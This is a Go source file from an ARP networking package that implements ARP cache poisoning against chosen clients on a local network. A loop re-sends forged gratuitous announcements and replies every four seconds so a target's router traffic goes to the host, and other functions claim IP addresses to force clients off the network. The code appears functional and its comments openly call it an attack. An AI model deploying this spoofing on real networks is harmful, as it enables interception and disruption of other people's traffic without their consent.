package arp

import (
	"context"
	"net"
	"time"

	"log"
)

// StartSpoofMAC performs the following:
//  1. set client state to "hunt" which will continuously spoof the client ARP table
//  2. start spoof goroutine to poison client arp table
//
// client will revert back to "normal" when a new IP is detected for the MAC
func (h *Handler) StartSpoofMAC(mac net.HardwareAddr) error {
	if Debug {
		log.Printf("arp force IP change mac=%s", mac)
	}

	h.Lock()
	defer h.Unlock()

	entry, _ := h.virtual.upsert(StateHunt, mac, nil)
	var ip net.IP
	for _, v := range h.LANHosts.FindMAC(mac) {
		if ip = v.IP.To4(); ip != nil {
			break
		}
	}
	go h.spoofLoop(context.Background(), entry, ip)
	return nil
}

// StopSpoofMAC terminate the hunting process
func (h *Handler) StopSpoofMAC(mac net.HardwareAddr) error {
	if Debug {
		log.Printf("arp stop IP change mac=%s", mac)
	}

	h.Lock()
	defer h.Unlock()
	h.virtual.delete(mac)
	return nil
}

// ClaimIP creates a virtual host to claim the ip
// When a virtual host exist, the handler will respond to ACD and request packets for the ip
func (h *Handler) ClaimIP(ip net.IP) {
	h.Lock()
	if virtual := h.virtual.findVirtualIP(ip); virtual == nil {
		virtual, _ = h.virtual.upsert(StateVirtualHost, newVirtualHardwareAddr(), ip)
		virtual.Online = false // indicates spoof goroutine is not running
	}
	h.Unlock()
}

// IPChanged is used to notify that the IP has changed.
//
// The package will detect IP changes automatically however some clients do not
// send ARP Collision Detection packets and hence do not appear as an immediate change.
// This method is used to accelerate the change for example when a
// new DHCP MACEntry has been allocated.
//
func (h *Handler) IPChanged(mac net.HardwareAddr, clientIP net.IP) {
	/****
	// Do nothing if we already have this mac and ip
	c.RLock()
	if client := c.table.findByMAC(mac); client != nil && client.Online && client.IP().Equal(clientIP) {
		c.RUnlock()
		return
	}
	c.RUnlock()

	if Debug {
		log.Printf("arp ip%s validating for mac=%s", clientIP, mac)
	}
	if err := c.Request(c.NICInfo.HostMAC, c.config.HostIP, EthernetBroadcast, clientIP); err != nil {
		log.Printf("arp request failed mac=%s: %s", mac, err)
	}

	go func() {
		for i := 0; i < 5; i++ {
			time.Sleep(time.Second * 1)
			c.RLock()
			if entry := c.table.findByMAC(mac); entry != nil && entry.IP().Equal(clientIP) {
				c.RUnlock()
				if Debug {
					log.Printf("arp ip=%s found for mac=%s ips=%s", entry.IP(), entry.MAC, entry.IPs())
				}
				return
			}
			c.RUnlock()

			// Silent request
			if err := c.request(c.NICInfo.HostMAC, c.config.HostIP, EthernetBroadcast, clientIP); err != nil {
				log.Printf("arp request 2 failed mac=%s ip=%s: %s", mac, clientIP, err)
			}
		}
		log.Printf("arp ip=%s not detect for mac=%s", clientIP, mac)

		// c.RLock()
		// c.table.printTable()
		// c.RUnlock()
	}()
	****/
}

// spoofLoop attacks the client with ARP attacks
//
// It will continuously send a number of ARP packets to client:
//   1. spoof the client arp table to send router packets to us
//   2. optionally, claim the ownership of the IP to force client to change IP or go offline
//
func (h *Handler) spoofLoop(ctx context.Context, client *MACEntry, ip net.IP) {

	h.Lock()
	mac := client.MAC
	client.Online = true // goroutine started
	h.Unlock()

	// 4 second re-arp seem to be adequate;
	// Experimented with 300ms but no noticeable improvement other the chatty net.
	ticker := time.NewTicker(time.Second * 4).C
	startTime := time.Now()
	nTimes := 0
	log.Printf("arp attack ip=%s client=%s time=%v", ip, mac, startTime)
	for {
		h.Lock()
		// Always search for MAC in case it has been deleted.
		client := h.virtual.findByMAC(mac)
		if client == nil || client.State != StateHunt {
			log.Printf("arp attack end client=%s repeat=%v duration=%v", mac, nTimes, time.Now().Sub(startTime))
			h.Unlock()
			return
		}

		h.Unlock()

		// Re-arp target to change router to host so all traffic comes to us
		// i.e. tell target I am 192.168.0.1
		//
		// Use virtual IP as it is guaranteed to not change.
		h.forceSpoof(mac, ip)

		if nTimes%16 == 0 {
			log.Printf("arp attack client=%s repeat=%v duration=%v", mac, nTimes, time.Now().Sub(startTime))
		}
		nTimes++

		select {
		case <-ctx.Done():
			return
		case <-ticker:
		}
	}
}

// forceSpoof send announcement and gratuitous ARP packet to spoof client MAC arp table to send router packets to
// host instead of the router
// i.e.  192.168.0.1->RouterMAC becames 192.168.0.1->HostMAC
//
// The client ARP table is refreshed often and only last for a short while (few minutes)
// hence the goroutine that re-arp clients
// To make sure the cache stays poisoned, replay every 5 seconds with a loop.
func (h *Handler) forceSpoof(mac net.HardwareAddr, ip net.IP) error {

	// Announce to target that we own the router IP
	// This will update the target arp table with our mac
	err := h.announce(mac, h.NICInfo.HostMAC, h.NICInfo.RouterIP4.IP, EthernetBroadcast, 2)
	if err != nil {
		log.Printf("arp error send announcement packet mac=%s ip=%s: %s", mac, ip, err)
		return err
	}

	// Send 3 unsolicited ARP reply; clients may discard this
	for i := 0; i < 2; i++ {
		err = h.reply(mac, h.NICInfo.HostMAC, h.NICInfo.RouterIP4.IP, mac, ip)
		if err != nil {
			log.Printf("arp error spoof client mac=%s ip=%s: %s", mac, ip, err)
			return err
		}
		time.Sleep(time.Millisecond * 10)
	}

	return nil
}

// forceAnnounce send a ARP packets to tell the network we are using the IP.
// NOT used anymore
func (h *Handler) forceAnnouncement(dstEther net.HardwareAddr, mac net.HardwareAddr, ip net.IP) error {
	err := h.announce(dstEther, mac, ip, EthernetBroadcast, 4) // many repeats to force client to reaquire IP
	if err != nil {
		log.Printf("arp error send announcement packet mac=%s ip=%s: %s", mac, ip, err)
	}

	// Send gratuitous ARP replies : Log the first one only
	// err = c.Reply(mac, ip, EthernetBroadcast, ip) // Send broadcast gratuitous ARP reply
	err = h.reply(dstEther, mac, ip, EthernetBroadcast, ip) // Send gratuitous ARP reply - unicast to target
	for i := 0; i < 3; i++ {
		if err != nil {
			log.Printf("arp error send gratuitous packet mac=%s ip=%s: %s", mac, ip, err)
		}
		time.Sleep(time.Millisecond * 10)

		// Dont show in log
		err = h.reply(dstEther, mac, ip, EthernetBroadcast, ip) // Send gratuitous ARP reply
	}

	return nil
}
